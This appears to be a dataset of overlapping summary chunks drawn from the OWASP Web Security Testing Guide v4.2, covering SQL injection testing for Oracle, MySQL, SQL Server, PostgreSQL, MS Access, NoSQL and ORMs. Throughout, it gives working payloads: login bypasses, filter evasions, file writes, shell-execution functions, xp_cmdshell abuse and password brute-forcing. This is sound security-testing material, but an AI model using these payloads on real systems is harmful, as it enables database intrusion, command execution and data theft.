procedures.\nIntroduces SQL commands that utilize LENGTH and SUBSTRING functions to infer data.\nOutlines a blind SQL injection attack method that results in a high volume of queries needing automation.\nDescribes an Error Based Exploitation Technique when other exploitation methods are not viable, such as the UNION technique."}
{"id": "WSTGv4_2-00099", "source": "wstg-v4.2_knowledge.json", "start_item": 1729, "end_item": 1743, "text": "ions to infer data.\nOutlines a blind SQL injection attack method that results in a high volume of queries needing automation.\nDescribes an Error Based Exploitation Technique when other exploitation methods are not viable, such as the UNION technique.\nProvides an example of a malicious SQL request that combines an ID with a function to extract user information.\nExplains how errors can be exploited to gain information from database error messages.\nIntroduces Out of Band Exploitation Techniques for Blind SQL Injection scenarios.\nInjecting SQL queries can reveal sensitive information when querying a database.\nEach Database Management System (DBMS) has unique functions that should be tested.\nExamples of SQL injection techniques include error-based techniques and time delay exploitation techniques.\nA malicious SQL request can be constructed to execute additional commands or utilize functions in the DBMS (e.g., using UTL_HTTP.request in Oracle).\nIn blind SQL injection scenarios, testers can exploit the response time of queries to infer outcomes without seeing direct feedback from the database.\nThe time delay exploitation technique involves sending a query that causes a delay in the response, thereby confirming the truth of the condition being tested.\nStored procedures must properly sanitize user input to prevent SQL injection attacks, as unsanitized input can result in executing malicious SQL.\nThe SQL Injection vulnerability is demonstrated through an insecure user login procedure that utilizes dynamic SQL without input sanitization.\nAn example of a potentially malicious user input, 'anyusername or 1=1'', can exploit this vulnerability and access existing user records.\nDynamic SQL queries can be dangerous when user inputs are allowed directly, as shown in the get_report stored procedure that can run arbitrary SQL code.\nAn example of malicious user input into the get_report procedure can allow an attacker to update all users' passwords with a simple command.\nAutomated tools like SQLMap can perform SQL Injection attacks automatically, highlighting the importance of proper security measures."}
{"id": "WSTGv4_2-00100", "source": "wstg-v4.2_knowledge.json", "start_item": 1744, "end_item": 1757, "text": "user input into the get_report procedure can allow an attacker to update all users' passwords with a simple command.\nAutomated tools like SQLMap can perform SQL Injection attacks automatically, highlighting the importance of proper security measures.\nSQL Injection Signature Evasion Techniques show strategies to bypass web application firewalls and intrusion prevention systems, underscoring the need for robust defenses against such attacks.\nWhitespace manipulation can be used as a technique to obscure SQL injection attempts, such as using spaces to separate components in a statement.\nAdding special characters like new lines or tabs doesn't change SQL statement execution.\nNull bytes (%00) can be used before characters that a filter is blocking to manipulate SQL injection.\nInline SQL comments (/**/) can help bypass SQL injection filters by making statements valid.\nURL encoding can transform SQL injection payloads to bypass filters, e.g., converting ' UNION SELECT password FROM Users WHERE name='admin'-- to its URL encoded form %27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--.\nCharacter encoding using the char() function can replace characters in a SQL string, e.g., char(114,111,111,116) for 'root'.\nString concatenation can disrupt SQL keywords to evade filters, with syntax varying by database engine. For example, MS SQL allows EXEC('SEL' + 'ECT 1').\nHex encoding replaces characters in SQL statements with their hexadecimal representation, e.g., 'root' is 726F6F74.\nExample SQL query: Select user from users where name = 'root' is equivalent to Select user from users where name = 726F6F74.\nAn alternative way to express SQL injection is using unhex function: Select user from users where name = unhex('726F6F74').\nSQL injection statement can be declared in a variable: declare @SQLivar nvarchar(80); set @SQLivar = N 'UNION SELECT password'; EXEC(@SQLivar).\nExpressions equivalent to 'or 1 = 1' are shown for SQL injection flexibility, including: OR 'SQLi' = 'SQL'+'i', OR 20 > 1, 1 || 1 = 1, etc.\nTo prevent SQL injection, consult SQL Injection Prevention CheatSheet, Database Security CheatSheet, and Input Validation CheatSheet."}
{"id": "WSTGv4_2-00101", "source": "wstg-v4.2_knowledge.json", "start_item": 1758, "end_item": 1772, "text": "to 'or 1 = 1' are shown for SQL injection flexibility, including: OR 'SQLi' = 'SQL'+'i', OR 20 > 1, 1 || 1 = 1, etc.\nTo prevent SQL injection, consult SQL Injection Prevention CheatSheet, Database Security CheatSheet, and Input Validation CheatSheet.\nTools for SQL injection include fuzzing tools (wfuzz), sqlbftools, sqlmap, and MySqloit.\nTechnology specific Testing Guide pages have been created for various DBMSs including Oracle, MySQL, SQL Server, PostgreSQL, MS Access, NoSQL, and ORM.\nThe page lists key whitepapers related to SQL Injection by various authors and organizations, including works by Victor Chapela and Chris Anley.\nImportant topics covered in the whitepapers include Advanced SQL Injection and Blind SQL Injection.\nDocumentation on SQL Injection vulnerabilities specifically in products, such as the anatomy of SQL injection in Drupal's database comment filtering system is mentioned.\nWeb based PL/SQL applications utilize the PL/SQL Gateway to translate web requests into database queries.\nThe PL/SQL Gateway functions as a proxy server for handling user web requests and interfacing with the database server.\nThe process flow involves accepting a request, processing it, executing instructions on the database, and relaying the output back to the user.\nPL/SQL code resides on the database server, making it vulnerable to attacks if the PL/SQL Gateway or applications have weaknesses.\nCommon URL patterns for PL/SQL web applications include 'http://www.example.com/pls/xyz', 'http://www.example.com/xyz/owa', and 'http://www.example.com/xyz/plsql'.\nThe absence of file extensions in a URL can suggest the use of Oracle PL/SQL Gateway, indicating possible vulnerabilities.\nDatabase Access Descriptors (DAD) are specified in PL/SQL web application URLs, which contain critical connection information.\nDADs (Database Access Descriptors) are specified in Apache configuration files like dads.conf or wdbsvr.app for different versions.\nSome default DADs include: SIMPLEDAD, HTMLDB, ORASSO, SSODAD, PORTAL, PORTAL2, PORTAL30, and several others.\nTo determine if the PL/SQL Gateway is running, one should analyze the technology being used, starting with URL formats."}
{"id": "WSTGv4_2-00102", "source": "wstg-v4.2_knowledge.json", "start_item": 1773, "end_item": 1787, "text": "r different versions.\nSome default DADs include: SIMPLEDAD, HTMLDB, ORASSO, SSODAD, PORTAL, PORTAL2, PORTAL30, and several others.\nTo determine if the PL/SQL Gateway is running, one should analyze the technology being used, starting with URL formats.\nServer response headers can indicate the use of the PL/SQL Gateway, with specific header values noted down in a table format.\nThe table provided lists several Oracle Application Server headers that suggest the presence of a PL/SQL Gateway: for example, 'Oracle-Application-Server-10g' and its versions.\nIn PL/SQL, 'NULL' is a valid expression, exemplified by the successful execution of a simple PL/SQL block with NULL.\nPL/SQL Gateway test methods using DAD and NULL to check server responses.\nHTTP requests to identify if server is running PL/SQL Gateway: `http://www.example.com/pls/dad/null` and `http://www.example.com/pls/dad/nosuchproc`.\nOWA_UTIL package outputs a PL/SQL signature and can be accessed via `http://www.example.com/pls/dad/owa_util.signature`.\nResponses indicate server configuration: 200 OK means PL/SQL Gateway is running; 403 Forbidden indicates it is accessible (older versions).\nArbitrary SQL queries can be executed using the OWA_UTIL package: `http://www.example.com/pls/dad/OWA_UTIL.CELLSPRINT?P_THEQUERY=SELECT+USERNAME+FROM+ALL_USERS`.\nCross-Site Scripting vulnerabilities via HTP package: `http://www.example.com/pls/dad/HTP.PRINT?CBUF=<script>alert('XSS')</script>`.\nOracle's exclusion list to prevent dangerous access (SYS.*, DBMS_*, HTP.*, OWA* packages).\nBypass of exclusion list possible, can exploit packages in other schemas like CTXSYS and MDSYS. Example query: `http://www.example.com/pls/dad/CXTSYS.DRILOAD.VALIDATE_STMT?SQLSTMT=SELECT+1+FROM+DUAL`.\nVulnerabilities in Oracle PL/SQL Gateway include access to admin pages (CVE-2002-0561) and buffer overflows (CVE-2002-0559).\nHistorical flaws can allow attackers to bypass the Exclusion List.\nOracle has faced multiple challenges in addressing flaws that allow attackers to bypass its PL/SQL Exclusion List.\nBypass Method 1: Using hex encoded newline, space, or tab to prefix the schema/package name."}
{"id": "WSTGv4_2-00103", "source": "wstg-v4.2_knowledge.json", "start_item": 1788, "end_item": 1801, "text": "ow attackers to bypass the Exclusion List.\nOracle has faced multiple challenges in addressing flaws that allow attackers to bypass its PL/SQL Exclusion List.\nBypass Method 1: Using hex encoded newline, space, or tab to prefix the schema/package name.\nBypass Method 2: Using a label with GOTO statement to gain access by prefixing with <<LBL>>.\nBypass Method 3: Using double quotes around the schema/package to bypass the exclusion list under certain conditions.\nBypass Method 4: Exploiting character set translations where certain characters like ÿ (0xFF) or Macron (0xAF) can be manipulated.\nBypass Method 5: Using a backslash (0x5C) to prefix the schema/package name to bypass the exclusion list.\nBypass Method 6: Sending complex requests that execute specific code on the database server.\nMongoDB's character set may impact how the requests are interpreted and handled by the server.\nThe provided code snippet showcases a PL/SQL procedure that initializes CGI environment variables, sets buffer lengths, checks for specific patterns in a user's request, and executes actions based on those checks.\nLines 19 and 24 of the code demonstrate how the request is validated against an exclusion list of 'bad' strings before executing the user-provided procedure, ensuring security checks are in place.\nThe 'XYZ' parameter shown in the code is used as a bind variable, which is a common practice in SQL for preventing SQL injection.\nAn example of potential SQL injection is illustrated with a request that includes malicious input, leading to an error due to the inclusion of unexpected symbols (e.g., single quote).\nThe document hints that by carefully crafting requests, an attacker may exploit this vulnerability to execute arbitrary SQL.\nThe inclusion of default PL/SQL packages that do not require parameters and do not match exclusion criteria could represent a security risk, as they may be leveraged for further exploitation.\nThe page discusses SQL injection vulnerabilities in web applications specifically related to PL/SQL.\nIt provides a list of targeted functions an attacker might exploit (e.g., `JAVA_AUTONOMOUS_TRANSACTION.PUSH`, `ORASSO.HOME`)."}
{"id": "WSTGv4_2-00104", "source": "wstg-v4.2_knowledge.json", "start_item": 1802, "end_item": 1816, "text": "r further exploitation.\nThe page discusses SQL injection vulnerabilities in web applications specifically related to PL/SQL.\nIt provides a list of targeted functions an attacker might exploit (e.g., `JAVA_AUTONOMOUS_TRANSACTION.PUSH`, `ORASSO.HOME`).\nSample URLs are provided to illustrate how attackers can manipulate queries to execute arbitrary SQL commands.\nDetailed examples show how attackers can use bind variables and PL/SQL functions like `HTP.PRINT` and `OWA_UTIL.CELLSPRINT` for exploitation.\nInstructions on how to form specific malicious URLs to exploit these vulnerabilities are given, emphasizing the risks associated with improperly sanitized input.\nSQL injection flaws can be exploited through vulnerabilities in PL/SQL applications.\nThe provided code demonstrates a SQL injection attack example using `DBMS_EXPORT_EXTENSION`.\nDuring black box assessments, security vulnerabilities in custom PL/SQL applications need to be evaluated without access to the source code.\nTesting for SQL injection involves checking input parameters by embedding single quotes and reviewing error messages for confirmation.\nExample of a test parameter that could indicate a SQL injection flaw is `author=DICK'ENS` which may return an error if vulnerable.\nThe concatenation operator can be used to confirm SQL injection by altering the request as shown in the code example: `author=DICK'||'ENS`.\nTools mentioned for assessing vulnerabilities include Orascan and NGS SQuirreL.\nSQL Injection vulnerabilities occur when input is included in SQL queries without proper constraints or sanitization.\nDynamic SQL construction through string concatenation can lead to SQL Injection.\nSQL Injection allows attackers access to SQL servers and enables them to execute SQL code with the database connection user's privileges.\nMySQL has unique characteristics requiring customized exploits for certain versions: 3.23.x, 4.0.x, 4.1.x, and 5.0.x.\nDifferent MySQL versions support different features relevant to SQL Injection: UNION (4.0), subqueries (4.1), stored procedures/functions and INFORMATION_SCHEMA view (5.0), triggers (5.0.2)."}
{"id": "WSTGv4_2-00105", "source": "wstg-v4.2_knowledge.json", "start_item": 1817, "end_item": 1837, "text": "oits for certain versions: 3.23.x, 4.0.x, 4.1.x, and 5.0.x.\nDifferent MySQL versions support different features relevant to SQL Injection: UNION (4.0), subqueries (4.1), stored procedures/functions and INFORMATION_SCHEMA view (5.0), triggers (5.0.2).\nBefore MySQL 4.0.x, only Boolean or time-based Blind Injection attacks could be performed due to lack of subquery functionality.\nThe example URL for testing SQL Injection is given as: ```http://www.example.com/page.php?id=2```\nMySQL uses a specific quote escaping: 'A string with \\ 'quotes\\ ''' which shows how it interprets escaped apostrophes.\nPassword queries using wildcard LIKE operator (e.g., 'A%').\nUsing ASCII values in hex for password matching (e.g., 0x4125).\nUtilizing CHAR() function for password comparison (e.g., CHAR(65,37)).\nMySQL connectors do not support multiple SQL commands in one injection due to library limitations.\nExample of failed multi-query injection: '1 ; update tablename set code='javascript code' where 1 --'.\nFingerprinting MySQL involves verifying if MySQL DBMS is being used, using special comment block features.\nCommenting techniques in MySQL ('/*! sql here*/') allow execution while ignored by other databases.\nMethods to gather MySQL version info include using global variable @@version, VERSION() function, and comment fingerprinting with version checks.\nExample of in-band injection to obtain MySQL version: '1 AND 1=0 UNION SELECT @@version /*'.\nInferential injection example: '1 AND @@version like '4.0%'.'\nUSER() gives the user connected to the MySQL Server.\nCURRENT_USER() returns the internal user executing the query, which may vary from the connected user.\nAn anonymous user can connect with any name, while CURRENT_USER() returns an empty name ('').\nStored procedures/functions execute as the creator's user unless defined otherwise.\nIn band injection example: `1 AND 1=0 UNION SELECT USER()` retrieves the user connected to MySQL.\nInferential injection example: `1 AND USER() like 'root%'` checks if the user starts with 'root'.\nThe DATABASE() function returns the name of the database in use.\nIn band injection example: `1 AND 1=0 UNION SELECT DATABASE()` retrieves the current database name."}
{"id": "WSTGv4_2-00106", "source": "wstg-v4.2_knowledge.json", "start_item": 1838, "end_item": 1852, "text": "injection example: `1 AND USER() like 'root%'` checks if the user starts with 'root'.\nThe DATABASE() function returns the name of the database in use.\nIn band injection example: `1 AND 1=0 UNION SELECT DATABASE()` retrieves the current database name.\nInferential injection example: `1 AND DATABASE() like 'db%'` checks if the database name starts with 'db'.\nINFORMATION_SCHEMA provides a structured way to get metadata about databases, tables, and other objects in MySQL.\nThe tables in INFORMATION_SCHEMA include SCHEMATA, SCHEMA_PRIVILEGES, TABLES, TABLE_PRIVILEGES, COLUMNS, COLUMN_PRIVILEGES, VIEWS, ROUTINES, TRIGGERS, USER_PRIVILEGES, each listing different privileges and information available about user access.\nSQL injection techniques can be used to extract sensitive information from databases.\nUsing the `INTO OUTFILE` clause allows a user with FILE privileges to export query results to a file.\nThe syntax for exporting results to a file is `Select * from table into outfile '/tmp/file'`.\nSingle quotes in filenames cannot be bypassed, limiting potential exploitation if input is sanitized.\nAn example of exploiting SQL injection to create a malicious file: `1 limit 1 into outfile '/var/www/root/test.jsp' FIELDS ENCLOSED BY '//' LINES TERMINATED BY '\\n<%jsp code here%>';`.\nThe created file can have read/write permissions for the MySQL user and group, potentially allowing code execution.\nThe `load_file` function can read a file’s content if the connected user has the appropriate FILE privileges.\nStandard SQL injection techniques can display results or cause MySQL errors to gain additional information.\nBlind SQL injection utilizes a set of functions provided by MySQL to deduce information without direct output.\nThe benchmark function can perform timing attacks when traditional blind injection methods fail.\nSLEEP() is an alternative function in MySQL (version greater than 5.0) that can be utilized alongside benchmark for timing attacks.\nA complete list of MySQL functions can be found in the MySQL manual."}
{"id": "WSTGv4_2-00107", "source": "wstg-v4.2_knowledge.json", "start_item": 1853, "end_item": 1868, "text": "ks when traditional blind injection methods fail.\nSLEEP() is an alternative function in MySQL (version greater than 5.0) that can be utilized alongside benchmark for timing attacks.\nA complete list of MySQL functions can be found in the MySQL manual.\nReference to various tools for SQL Injection testing, including Francois Larouche's multiple DBMS SQL Injection tool, Reversing.org's sqlbftools, Bernardo Damele A. G.'s sqlmap, and Muhaimin Dzulfakar's MySqloit.\nMention of relevant resources such as whitepapers and case studies that discuss exploiting SQL injection vulnerabilities, including Chris Anley's 'Hackproofing MySQL' and Zeelock's case study on Blind Injection techniques.\nSQL injection vulnerabilities occur when input is used in SQL queries without being properly sanitized.\nDynamic SQL increases the risk of SQL injection attacks.\nAn attacker can exploit SQL injection to execute SQL code with the privileges of the connected database user.\nParameters that can hide vulnerabilities include query strings, POST request bodies, and various types of user and session information.\nMicrosoft SQL Server has unique characteristics requiring customized exploits for SQL injection.\nSQL Server operators and commands useful for testing include the comment operator '--' and query separator ';'.\nUseful stored procedures for SQL injection tests include xp_cmdshell, xp_regread, xp_regwrite, sp_makewebtask, and xp_sendmail.\nExamples of executing shell commands using xp_cmdshell demonstrate how to exploit SQL Server vulnerabilities.\nUsage of `sp_makewebtask` for creating browsable files on SQL Server; however, this method is deprecated.\nExample of SQL injection using `db_name()` to reveal the database name through an error trigger.\nExplanation of the `CONVERT` function syntax in SQL: `CONVERT ( data_type [ ( length ) ] , expression [ , style ] )`.\nExample of SQL injection to find the SQL Server version using the `@@version` environment variable.\nInstruction on testing for SQL injection in GET requests, using a common login bypass method with the input `'%20or%20'1'='1`.\nExample of SQL injection to determine the number of columns in a response using `UNION ALL` statement."}
{"id": "WSTGv4_2-00108", "source": "wstg-v4.2_knowledge.json", "start_item": 1869, "end_item": 1882, "text": "nvironment variable.\nInstruction on testing for SQL injection in GET requests, using a common login bypass method with the input `'%20or%20'1'='1`.\nExample of SQL injection to determine the number of columns in a response using `UNION ALL` statement.\nExample of SQL injection in a POST request to illustrate data submission vulnerabilities.\nThe content is derived from the Web Security Testing Guide, emphasizing SQL Injection techniques.\nAn example of a bug with input validation is shown; a SQL error occurs when a single quote is inputted in the email field.\nA method for obtaining application source code through SQL injection is presented using xp_cmdshell.\nA table highlights best practices for SQL Server security, particularly advising to disable xp_cmdshell.\nTwo examples of methods to create xp_cmdshell on SQL Server 2000 and 2005 are provided, emphasizing the need for sysadmin rights to bypass restrictions.\nExample of SQL Injection using Referer header to execute arbitrary SQL code with input like 'Referer: https://vulnerable.web.app/login.aspx', 'user_agent', 'some_ip'); [SQL CODE]--\nExample of SQL Injection using User-Agent header to execute similar arbitrary SQL code.\nDescription of the OPENROWSET command in SQL Server to perform port scanning by executing queries on another DB Server.\nDemonstration of how to use OPENROWSET to attempt connections to various ports and analyze error messages to determine if they are open or closed.\nExplanation of how to upload executables to the target DB Server using xp_cmdshell, with an example script to upload netcat.exe via FTP.\nOutline of an alternative method to upload executables using debug.exe if FTP is blocked, including methods to convert executables into script files for debug.exe.\nThe provided SQL commands utilize the `xp_cmdshell` function to execute commands that write debugging information to a file on the target machine.\nTools such as Bobcat and Sqlninja automate the process of executing payloads in Windows and Unix environments, respectively."}
{"id": "WSTGv4_2-00109", "source": "wstg-v4.2_knowledge.json", "start_item": 1883, "end_item": 1899, "text": "ands utilize the `xp_cmdshell` function to execute commands that write debugging information to a file on the target machine.\nTools such as Bobcat and Sqlninja automate the process of executing payloads in Windows and Unix environments, respectively.\nIf a web application does not return useful information, penetration testers can review the source code if it is available, to exploit SQL injection vulnerabilities offline.\nBlind SQL injection can be tested by entering crafted input that manipulates queries, such as using 'Bomba' OR 1=1- to test for vulnerabilities.\nError messages can provide insight into vulnerabilities, even when descriptive messages are suppressed, through HTTP status codes like 500 or 200 with custom messages.\nTiming attacks can exploit the time taken by the web application to respond to a request, using commands like `waitfor delay` to infer information about the existence of databases or tables.\nThe concept of SQL injection vulnerability and its exploitation through covert channels to retrieve information.\nUse of response time to deduce data through a series of crafted SQL queries.\nExample query for determining the length of a database name based on response time.\nTechniques for extracting data using SQL queries that measure response time based on SQL injection.\nThe alternative methods for blind SQL injection when standard techniques are filtered by security tools.\nChecking the version of SQL Server using timing-based SQL injection.\nThe structure of SQL queries to identify SQL Server versions through substring operations and response delays.\nExample code for brute-forcing sysadmin passwords using OPENROWSET and response timing.\nAttempting connection to local database using credentials: | sa | and | <pwd> |\nIf password correct, query executed with a 5 second wait, useful for brute-forcing passwords.\nFetching candidate passwords from a wordlist and measuring connection time to guess the password.\nReferencing David Litchfield's technique of using SQL injection for brute-forcing passwords via database resources.\nOnce sysadmin password obtained, can inject further queries using OPENROWSET to gain privileges."}
{"id": "WSTGv4_2-00110", "source": "wstg-v4.2_knowledge.json", "start_item": 1900, "end_item": 1918, "text": "onnection time to guess the password.\nReferencing David Litchfield's technique of using SQL injection for brute-forcing passwords via database resources.\nOnce sysadmin password obtained, can inject further queries using OPENROWSET to gain privileges.\nUsing sp_addsrvrolemember to add user to sysadmin group, while extracting current username via inference injection.\nNote on accessibility: OPENROWSET available to all users on SQL Server 2000, restricted to admins on SQL Server 2005.\nMention of tools like sqlmap for automated SQL injection attacks.\nReferences to various relevant whitepapers and resources on SQL injection.\nSQL Injection techniques for PostgreSQL are discussed.\nPHP Connector allows multiple statements to be executed using `;` as a statement separator.\nSQL Statements can be truncated by appending the comment char: `--`.\n`LIMIT` and `OFFSET` can be used in a `SELECT` statement to retrieve a portion of the result set generated by the query.\nAssumes that `http://www.example.com/news.php?id=1` is vulnerable to SQL Injection attacks.\nTo identify PostgreSQL, use the `::` cast operator.\nExample to fingerprint PostgreSQL: `http://www.example.com/store.php?id=1 AND 1::int=1`\nThe `version()` function can grab the PostgreSQL banner, showing the OS type and version.\nExample for grabbing the version banner: `http://www.example.com/store.php?id=1 UNION ALL SELECT NULL,version(),NULL LIMIT 1 OFFSET 1--`\nExample of a banner string that could be returned: \"PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)\"\nFor blind SQL injection attacks, consider the built-in function `LENGTH(str)` for string length.\nUse `SUBSTR(str,index,offset)` to extract a substring from a given string.\nUse `CHR(104)||CHR(101)||CHR(108)||CHR(108)||CHR(111)` for string representation with no single quotes.\nPostgreSQL version 8.2 introduced `pg_sleep(n)` to make the current session process sleep for `n` seconds, useful for timing attacks.\nYou can create a custom `pg_sleep(n)` in previous versions with: `CREATE function pg_sleep(int) RETURNS int AS '/lib/libc.so.6', 'sleep' LANGUAGE 'C' STRICT`."}
{"id": "WSTGv4_2-00111", "source": "wstg-v4.2_knowledge.json", "start_item": 1919, "end_item": 1935, "text": "p(n)` to make the current session process sleep for `n` seconds, useful for timing attacks.\nYou can create a custom `pg_sleep(n)` in previous versions with: `CREATE function pg_sleep(int) RETURNS int AS '/lib/libc.so.6', 'sleep' LANGUAGE 'C' STRICT`.\nStrings can be encoded to prevent single quotes escaping by using the `chr()` function.\nFunctions chr(n) and ascii(n) allow encoding and decoding between ASCII values and characters.\nExample illustrates encoding the string 'root' to its ASCII representation using chr() and ascii().\nSQL injection example shows how to update a password field with encoded string.\nCurrent user can be retrieved in PostgreSQL using various SELECT statements like current_user and session_user.\nExample demonstrates how to use UNION ALL to extract current user information through SQL injection.\nThe current_database() function retrieves the name of the current database.\nPostgreSQL provides access to local files through COPY statement and pg_read_file() function.\nWeb Security Testing Guide v4.2 discusses SQL Injection techniques, including UNION Query SQL Injection.\nExamples of SQL injection with syntax provided for extracting data from a `file_store` table.\nThe pg_read_file() function in PostgreSQL allows reading arbitrary files located within the DBMS data directory since version 8.1.\nExamples of using pg_read_file() to read a file: `SELECT pg_read_file('server.key',0,1000);`\nCOPY statement is discussed, showing how to write data to the local file system: `/store.php?id=1; COPY file_store(data) TO '/var/lib/postgresql/copy_output'--`\nShell Injection is explained, along with how PostgreSQL allows adding custom functions using Dynamic Library and scripting languages like Python, Perl, and TCL.\nCreating a table to capture stdout from shell commands is demonstrated with examples.\nExample SQL for executing shell commands and capturing output using COPY: `COPY stdout(system_out) FROM '/tmp/test'`.\nCustom function for executing shell commands can be created as shown: `CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT`."}
{"id": "WSTGv4_2-00112", "source": "wstg-v4.2_knowledge.json", "start_item": 1936, "end_item": 1959, "text": "mmands and capturing output using COPY: `COPY stdout(system_out) FROM '/tmp/test'`.\nCustom function for executing shell commands can be created as shown: `CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT`.\nPL/Python allows users to code PostgreSQL functions in Python; it's untrusted and can do anything.\nTo check if PL/Python is enabled:\n```code SELECT count(*) FROM pg_language WHERE lanname='plpythonu' ```\nTo enable PL/Python:\n```code CREATE LANGUAGE plpythonu ```\nTo create a proxy shell function in PL/Python:\n```code CREATE FUNCTION proxyshell(text) RETURNS text AS 'import os; return os.popen(args[0]).read()' LANGUAGE plpythonu ```\nTo execute a command:\n```code SELECT proxyshell(os command); ```\nPL/Perl allows PostgreSQL functions in Perl, usually as trusted to prevent OS commands.\nCheck if PL/Perl untrusted is enabled:\n```code SELECT count(*) FROM pg_language WHERE lanname='plperlu' ```\nTo enable PL/Perl untrusted:\n```code CREATE LANGUAGE plperlu ```\nCreate a proxy shell function in PL/Perl:\n```code CREATE FUNCTION proxyshell(text) RETURNS text AS 'open(FD,\"$_[0] |\");return join(\"\",<FD>);' LANGUAGE plperlu ```\nRun an OS command in PL/Perl:\nSQL injection vulnerabilities occur when user-supplied input is not properly sanitized in a SQL query.\nSQL injection can allow an attacker to execute SQL code with the privileges of the database connection user.\nFingerprinting the database technology is crucial for identifying SQL vulnerabilities, typically done by injecting SQL patterns and observing error messages.\nSpecific error messages can confirm the use of MS Access: 'com_exception', '80040e14', and 'Microsoft Office Access Database Engine'.\nMS Access lacks certain SQL injection features like comments characters, stacked queries, LIMIT, and sleep-like operators, but alternative techniques can be used.\nInjecting a null character (%00) can bypass certain limitations in SQL queries by terminating strings, although it may also lead to issues at the web server level.\nIf the null character causes problems, an alternative character (0x16 or %16) may be employed to achieve similar results."}
{"id": "WSTGv4_2-00113", "source": "wstg-v4.2_knowledge.json", "start_item": 1960, "end_item": 1982, "text": "n bypass certain limitations in SQL queries by terminating strings, although it may also lead to issues at the web server level.\nIf the null character causes problems, an alternative character (0x16 or %16) may be employed to achieve similar results.\nSQL Injection example query: ```SELECT [username],[password] FROM users WHERE [username]='$myUsername' AND [password]='$myPassword'```\nTruncate query examples: `http://www.example.com/page.asp?user=admin'%00&pass=foo` and `http://www.example.com/page.app?user=admin'%16&pass=foo`\nLimit results in MS Access using TOP or LAST instead of LIMIT.\nExample of limiting results: `http://www.example.com/page.app?id=2'+UNION+SELECT+TOP+3+name+FROM+appsTable%00`\nFunctions for SQL injection testing include:\n- ASC: Obtain ASCII value of a character\n- CHR: Obtain character of ASCII value\n- LEN: Return length of a string\n- IIF: Returns 'a' if condition is true\n- MID: Extract substring\nExample of using TOP: `SELECT TOP 1` returns only 1 row.\nLAST function returns the last row: `SELECT last(*) FROM users`\nAttributes enumeration technique involves analyzing error messages during SQL injection.\nCommon MS Access system tables to check: MSysObjects, MSysACEs, MSysAccessXML.\nUsing standard wordlists (like FuzzDb) can automate database schema brute-forcing.\nDirect access to .mdb files in the webroot can lead to database exposure.\nBlind SQL Injection relies on response time or output variations to infer data.\nExample of a SQL query for blind injection: http://www.example.com/index.php?myId=[sql]\nSQL command structure for extracting specific data from the database with blind SQL injection.\nUtilization of IFF, MID, LAST, and TOP functions to extract specific characters from database queries.\nThe significance of error handling (like 500 Internal Server Errors) in determining the success of SQL injections.\nThe page discusses a specific SQL injection technique that utilizes blind SQL injection to infer database content by trying arbitrary strings.\nThe provided code snippet is a URL with an SQL injection payload aimed at extracting the first character of usernames from a database."}
{"id": "WSTGv4_2-00114", "source": "wstg-v4.2_knowledge.json", "start_item": 1983, "end_item": 1994, "text": "ic SQL injection technique that utilizes blind SQL injection to infer database content by trying arbitrary strings.\nThe provided code snippet is a URL with an SQL injection payload aimed at extracting the first character of usernames from a database.\nThe method described involves checking each printable value to find a match for the first character of a username.\nAdditionally, it mentions using the LEN function to determine the length of strings in the database.\nThe content suggests that time-based blind SQL injections can be employed by utilizing complex queries that take longer to execute.\nNoSQL databases provide looser consistency restrictions than SQL databases, leading to performance benefits but also vulnerabilities to injection attacks.\nInjection attacks in NoSQL can execute within a procedural language instead of a declarative SQL language, potentially leading to greater impacts.\nMalicious input targeting NoSQL APIs may not be caught by conventional application sanitization checks, as traditional special characters like <, >, & are irrelevant in contexts such as JSON APIs.\nTesting for NoSQL injection vulnerabilities requires understanding the specific syntax, data model, and underlying programming language of each NoSQL database, as over 150 NoSQL databases exist.\nNoSQL injection attacks can execute in different parts of the application compared to traditional SQL injections, more often executed in either the application layer or the database layer depending on the NoSQL API used.\nIn MongoDB, user input must not be passed directly into critical API calls like the $where operator without proper sanitization, or it can lead to arbitrary JavaScript execution in queries.\nExample of vulnerable MongoDB API call: ```code db.myCollection.find( { active: true, $where: function() { return obj.credits - obj.debits < $userInput; } } );```\nDemonstrating injection vulnerabilities does not require full exploitation; testing can use special characters relevant to the API.\nIn MongoDB, unsanitized inputs containing specific special characters can trigger database errors."}
{"id": "WSTGv4_2-00115", "source": "wstg-v4.2_knowledge.json", "start_item": 1995, "end_item": 2015, "text": "serInput; } } );```\nDemonstrating injection vulnerabilities does not require full exploitation; testing can use special characters relevant to the API.\nIn MongoDB, unsanitized inputs containing specific special characters can trigger database errors.\nNormal SQL injection allows arbitrary SQL commands, while JavaScript-based attacks can run arbitrary code.\nExample input for testing: `0;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000)` which increases CPU usage.\nReserved variable names in NoSQL databases can be exploited even if inputs are parameterized.\nExample of dangerous PHP variable `$where` being exploited in MongoDB queries.\nDevelopers are warned to use single quotes for special query operators to avoid variable replacement.\nInjection payloads can demonstrate vulnerabilities even when user input is sanitized.\nObject Relational Mapping (ORM) Injection is an SQL Injection attack targeting ORM-generated data access models.\nORM tools provide benefits like quick object layer generation and safe functions against SQL Injection.\nORM generated objects perform CRUD operations and can still be vulnerable to SQL Injection if unsanitized input parameters are used.\nTo test for ORM vulnerabilities, identify the ORM layer used in the application and understand its parser's function.\nA weak implementation of ORM can lead to SQL Injection vulnerabilities, where positional parameters are not utilized properly.\nExample of a vulnerable scenario shows how not using positional parameters can expose the application to SQL Injection.\nProper implementation of ORM requires the use of positional parameters for input sanitization.\nORM layers can be vulnerable like any other code.\nThe sequelize ORM npm library was identified as vulnerable in 2019.\nResearch by RIPS Tech identified bypasses in the hibernate ORM used by Java.\nA cheat sheet for SQL injection testing for various databases includes:\nMySQL: abc' INTO OUTFILE --\nPostgreSQL: $$='$$=chr(61)\nOracle: ```code NVL(TO_CHAR(DBMS_XMLGEN.getxml('select 1 where 1337>1')),'1')!='1' ```\nMS SQL: 1<LEN(%C2%A0(select%C2%A0top%C2%A01%C2%A0name%C2%A0from%C2%A0users)"}
